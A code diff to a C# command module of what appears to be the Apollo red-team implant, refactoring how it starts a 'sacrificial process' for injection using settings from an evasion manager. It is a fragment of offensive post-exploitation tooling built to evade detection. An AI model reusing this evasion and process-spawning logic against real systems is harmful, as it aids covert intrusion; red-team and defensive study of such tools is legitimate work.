@@ -104,23 +104,19 @@ namespace Apollo.CommandModules
                 return;
             }
 
-            if (implant.architecture == "x64")
-                sacrificialApplication = EvasionManager.SpawnTo64;
-            else
-                sacrificialApplication = EvasionManager.SpawnTo86;
-
+            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();
             try
             {
                 
-                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, commandLine, true);
+                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);
 
                 if (sacrificialProcess.Start())
                 {
                     string status = "";
-                    if (!string.IsNullOrEmpty(commandLine))
-                        status = $"Sacrificial process spawned '{sacrificialApplication} {commandLine}' (PID: {sacrificialProcess.PID})\n";
+                    if (!string.IsNullOrEmpty(startupArgs.Arguments))
+                        status = $"Sacrificial process spawned '{startupArgs.Application} {startupArgs.Arguments}' (PID: {sacrificialProcess.PID})\n";
                     else
-                        status = $"Sacrificial process spawned {sacrificialApplication} (PID: {sacrificialProcess.PID})\n";
+                        status = $"Sacrificial process spawned {startupArgs.Application} (PID: {sacrificialProcess.PID})\n";
 
                     job.AddOutput(status);
                     job.ProcessID = (int)sacrificialProcess.PID;
